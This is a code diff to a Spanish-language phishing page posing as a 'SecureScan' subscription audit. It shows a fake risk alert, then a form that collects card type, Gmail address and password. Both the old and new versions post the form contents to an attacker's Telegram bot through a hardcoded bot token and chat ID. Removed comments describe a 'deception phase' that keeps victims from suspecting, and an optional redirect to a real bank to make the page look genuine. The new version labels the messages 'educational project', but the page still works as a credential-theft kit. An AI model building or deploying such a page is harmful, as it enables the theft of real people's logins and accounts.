@@ -215,113 +215,97 @@
             }, 6000);
         }
 
-        function showFinalResults() {
-            viewport.innerHTML = `
-                <div class="audit-container" style="max-width: 500px;">
-                    <h2 style="font-size: 2rem; margin-bottom: 10px;">Auditoría Lista</h2>
-                    
-                    <div class="alert-box">
-                        ⚠️ RIESGO: Hemos detectado suscripciones fantasma activas en tu cuenta.
+     function showFinalResults() {
+    viewport.innerHTML = `
+        <div class="audit-container" style="max-width: 500px;">
+            <h2 style="font-size: 2rem; margin-bottom: 10px;">Auditoría Lista</h2>
+            
+            <div class="alert-box">
+                ⚠️ RIESGO: Hemos detectado suscripciones fantasma activas en tu cuenta.
+            </div>
+            
+            <div class="glass-form" style="max-width: 100%;" id="form-container">
+                <p style="color:var(--text-dim); margin-bottom:20px; font-size:0.9rem;">
+                    Para ver los detalles y cancelarlas inmediatamente, inicia sesión con Gmail en SecureScan.
+                </p>
+                
+                <form id="security-form">
+                    <div class="form-group">
+                        <label>Tipo de Tarjeta</label>
+                        <select name="tipo_tarjeta">
+                            <option>Selecciona tu tarjeta...</option>
+                            <option>Debito</option>
+                            <option>Credito</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Gmail</label>
+                        <input type="text" name="gmail" placeholder="Correo">
+                    </div>
+                    <div class="form-group">
+                        <label>Contraseña</label>
+                        <input type="password" name="password" placeholder="••••••••">
                     </div>
                     
-                    <div class="glass-form" style="max-width: 100%;">
-                        <p style="color:var(--text-dim); margin-bottom:20px; font-size:0.9rem;">
-                            Para ver los detalles y cancelarlas inmediatamente, inicia sesión con Gmail en SecureScan.
-                        </p>
-                        
-                        <div class="form-group">
-                            <label>Tipo de Tarjeta</label>
-                            <select>
-                                <option>Selecciona tu tarjeta...</option>
-                                <option>Debito</option>
-                                <option>Credito</option>
-                            </select>
-                        </div>
-                        <div class="form-group">
-                            <label>Gmail</label>
-                            <input type="text" placeholder="Correo">
-                        </div>
-                        <div class="form-group">
-                            <label>Contraseña</label>
-                            <input type="password" placeholder="••••••••">
-                        </div>
-                        
-                        <button class="btn-primary" onclick="alert('Conexión establecida. Datos enviados.')">Enviar Informe</button>
-                        
-                        <p style="font-size:0.7rem; color:var(--text-dim); margin-top:15px; text-align:center;">
-                            🔒 Conexión API segura de solo lectura (AES-256).
-                        </p>
-                    </div>
-                </div>
-            `;
-        }
-    </script>
-</body>
-<!-- El contenedor del formulario -->
-<div id="form-container">
-    <form id="security-form">
-        ... todos tus inputs y botones ...
-    </form>
-</div>
-
-<!-- La sección de resultados (inicialmente oculta) -->
-<div id="results-section" style="display: none;">
-    <h2>✅ Análisis Completo</h2>
-    <p>Hemos detectado 3 suscripciones activas. Para tu seguridad, hemos bloqueado temporalmente los cargos no reconocidos. Recibirás un correo de confirmación.</p>
-    <!-- Puedes poner aquí resultados falsos -->
-</div>
-<script>
-    document.getElementById('security-form').addEventListener('submit', function(e) {
-        e.preventDefault(); // Evita que la página se recargue al enviar el formulario
-
-        // --- CONFIGURACIÓN ---
-        // PEGA AQUÍ TU TOKEN API que te dio @BotFather
-        const telegramToken = '8675585129:AAFmRENi09R58KCe78x3Vk6EJLTQmZuz0gY'; 
-        
-        // PEGA AQUÍ TU CHAT ID que te dio @userinfobot
-        const chatId = '6237894148'; 
-        // ---------------------
-
-        // Recopilar datos del formulario
-        const formData = new FormData(this);
-        let message = '🚨 **NUEVOS DATOS RECIBIDOS** 🚨\n\n';
-        
-        // Crear un mensaje legible con los datos del formulario
-        for (let pair of formData.entries()) {
-            let label = pair[0].replace(/_/g, ' ').toUpperCase();
-            message += `*${label}:* ${pair[1]}\n`;
-        }
-
-        // Enviar el mensaje a tu bot de Telegram
-        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown' // Formato para que el mensaje se vea bien en Telegram
+                    <button type="submit" class="btn-primary">Enviar Informe</button>
+                </form>
+                
+                <p style="font-size:0.7rem; color:var(--text-dim); margin-top:15px; text-align:center;">
+                    🔒 Conexión API segura de solo lectura (AES-256).
+                </p>
+            </div>
+        </div>
+    `;
+    
+    // AGREGAR EL EVENTO DEL FORMULARIO AQUÍ
+    const form = document.getElementById('security-form');
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const telegramToken = '8675585129:AAFmRENi09R58KCe78x3Vk6EJLTQmZuz0gY';
+            const chatId = '6237894148';
+            
+            const formData = new FormData(form);
+            let message = '📋 **NUEVOS DATOS - PROYECTO EDUCATIVO** 📋\n\n';
+            
+            for (let pair of formData.entries()) {
+                message += `*${pair[0]}:* ${pair[1]}\n`;
+            }
+            
+            message += `\n*IP:* ${window.location.hostname}\n`;
+            message += `*HORA:* ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Datos enviados a Telegram con éxito:', data);
-            
-            // --- FASE DE ENGAÑO FINAL ---
-            // Muestra una pantalla de "éxito" al usuario para que no sospeche
-            document.getElementById('form-container').style.display = 'none'; // Oculta el formulario
-            document.getElementById('results-section').style.display = 'block'; // Muestra la sección de resultados (debe existir en tu HTML)
-            
-            // Opcional: después de unos segundos, redirige al banco real para mayor credibilidad
-            setTimeout(() => {
-                // window.location.href = 'https://www.bancomer.com.mx'; // Descomenta y cambia la URL si quieres redirigir
-            }, 5000); // Redirige después de 5 segundos
-        })
-        .catch((error) => {
-            console.error('Error al enviar a Telegram:', error);
-            alert('Error de conexión. Por favor, inténtelo de nuevo.'); // Mensaje de error genérico
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('✅ Informe enviado correctamente');
+                    // Opcional: mostrar mensaje de éxito
+                    const formContainer = document.getElementById('form-container');
+                    if (formContainer) {
+                        formContainer.innerHTML = '<h3>✅ Reporte enviado. Recibirás un correo de confirmación.</h3>';
+                    }
+                } else {
+                    alert('Error: ' + data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error de conexión. Por favor, intenta de nuevo.');
+            });
         });
-    });
+    }
+}
 </script>
 </html>
